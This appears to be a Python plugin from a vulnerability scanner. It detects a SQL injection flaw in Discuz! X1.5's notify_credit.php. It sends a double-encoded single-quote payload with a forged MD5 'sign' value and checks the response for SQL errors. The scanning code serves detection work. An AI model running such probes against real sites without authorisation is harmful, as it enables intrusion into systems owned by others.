# -*- coding: utf-8 -*-
'''
本插件针对 DiscuzX1.5 的 notify_credit 漏洞进行检测
author: lidq
created: 20161208
'''

import hashlib

#导入SQL注入通用库，本插件是SQL注入基础插件，故写在通用库中
#导入url请求公用库
from engine.engine_utils.InjectUrlLib import *
from engine.engine_utils.common import *
#导入日志处理句柄
from engine.logger import scanLogger as logger
#导入默认的header头
from engine.engine_utils.DictData import headerDictDefault


def run_domain(http, config):
    '''
    重写run_url函数，实现检测SQL注入的功能
    有异常时，直接输出异常
    无异常时，以list类型返回检测结果记录
    '''

    #重新组织请求的参数
    scanInfo = {}
    scanInfo['siteId'] = config['siteId']
    scanInfo['ip'] = config['ip']
    scanInfo['scheme'] = config['scheme']
    scanInfo['domain'] = config['domain']
    scanInfo['level'] = config['level']
    scanInfo['vulId'] = config['vulId']
    headers = headerDictDefault
    headers['cookie'] = config['cookie']
    headers['Host'] = config['domain']
    source_ip = config.get('source_ip')
    print scanInfo
    responseList = []
    try:
        #使用单引号测试是否存在SQL报错，有则存在漏洞
        payload = "'"
        if source_ip:
            urlBase = scanInfo['scheme'] + "://" + source_ip + "/api/trade/notify_credit.php"
        else:
            urlBase = scanInfo['scheme'] + "://" + scanInfo['domain'] + "/api/trade/notify_credit.php"

        body = "attach=tenpay&retcode=0&trade_no=%2527&mch_vno=" + urllib.quote(urllib.quote(payload)) + "&sign=" + discuzx15_sign(payload)
        response = request(url=urlBase, body=body, headers=headers, method="POST")
        if response['httpcode'] == 200:
            if response['response_body'].find("SQL syntax") != -1:
                injectInfo = returnInjectResult(url=urlBase, confirm=1, detail="Discuz! X1-1.5 的 notify_credit.php 文件由于没有对用户输入进行有效的过滤导致存在SQL盲注", response=response)
                responseList.append(getRecord2(scanInfo, injectInfo))
                return responseList

    except Exception,e:
        logger.error("File:DiscuzX15_notify_credit.py:" + str(e))
    return responseList

def discuzx15_sign(exp_str):
    rawStr = "attach=tenpay&mch_vno="+exp_str+"&retcode=0&key="
    return hashlib.md5(rawStr).hexdigest()

